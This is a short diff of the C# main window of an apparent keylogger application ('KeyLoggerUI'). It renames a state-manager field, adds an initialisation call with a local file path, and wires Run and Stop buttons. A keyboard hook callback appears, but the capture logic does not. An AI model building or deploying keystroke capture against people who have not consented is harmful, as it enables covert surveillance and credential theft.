@@ -37,7 +37,7 @@ namespace KeyLoggerUI
     {
         CancellationTokenSource cts = new CancellationTokenSource();
         NativeMethods.HookProc callback = KeystrokesManager.CallbackFunction;
-        StateControllersManager mngr;
+        StateControllersManager stateMngr;
         public MainWindow()
         {            
 
@@ -46,7 +46,8 @@ namespace KeyLoggerUI
             //var mngr = KeystrokesManager.GetKeyStrokesManager();
             //runBtn.IsEnabled = true;
             //stopBtn.IsEnabled = false;
-            mngr = StateControllersManager.GetStateController();            
+            stateMngr = StateControllersManager.GetStateController();
+            stateMngr.Initilize(@"C:\Users\mhdb9\Desktop\tetste.cic");
         }
         //void SetTime()
         //{
@@ -77,7 +78,7 @@ namespace KeyLoggerUI
         //}
         private async void runBtn_Click(object sender, RoutedEventArgs e)
         {
-            mngr.Run();
+            stateMngr.Run();
             //try
             //{
             //    runBtn.IsEnabled = false;
@@ -96,7 +97,7 @@ namespace KeyLoggerUI
 
         private void stopBtn_Click(object sender, RoutedEventArgs e)
         {
-            mngr.Stop();
+            stateMngr.Stop();
             //cts.Cancel();
             //cts = new CancellationTokenSource();
             //Trace.Listeners.Clear();
